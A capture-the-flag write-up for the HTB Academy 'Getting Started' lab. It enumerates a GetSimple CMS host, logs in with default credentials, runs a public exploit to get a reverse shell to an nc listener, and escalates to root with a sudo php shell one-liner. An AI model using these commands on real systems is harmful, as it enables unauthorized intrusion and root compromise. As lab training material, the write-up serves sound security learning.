---
slug: /write-up/htb-academy/getting-started
pagination_next: null
pagination_prev: null
---

This is the write-up for the assessment of HTB academy [Getting started](https://academy.hackthebox.com/module/details/77) module.

## Enumeration

The machine has open ports in 22 and 80

SSH banner: `OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0`

There's an apache webserver in 80:

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
```

```bash
└──╼ $whatweb http://10.129.235.190/
http://10.129.235.190/ [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.235.190], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]
```

From the previous scans we can see it's using the `GetSimple` cms.

## Foothold

We search the default credentials and `admin:admin` worked.

Checking the vulnerabilities for the CMS, I found this one https://www.exploit-db.com/exploits/51475.

Then, it's a matter of download the exploit, run it and configure a remote shell using nc:

```bash
nc -lvnp 4444
```
and launch the exploit:
```bash
python3 51475.py 10.129.235.190 / 10.10.15.50:4444 admin
```

And we have foothold onto the machine with `www-data` user:
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.50] from (UNKNOWN) [10.129.235.190] 52682
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Now, we just need to improve the shell and retrieve the user flag.

## Privilege escalation

Now, we can escalate privileges. First we check what root permissions have the user:

```bash
www-data@gettingstarted:/home/mrb3n$ sudo -l
sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

The user `www-data` can execute the `php` binary as root without providing a password. This is a very bad idea. A quick search in GTFObins give a easy payload to get a root shell:

```bash
www-data@gettingstarted:/home/mrb3n$ sudo php -r 'system("/bin/sh");'
sudo php -r 'system("/bin/sh");'
id
id
uid=0(root) gid=0(root) groups=0(root)
```
Now we can retrieve the root flag.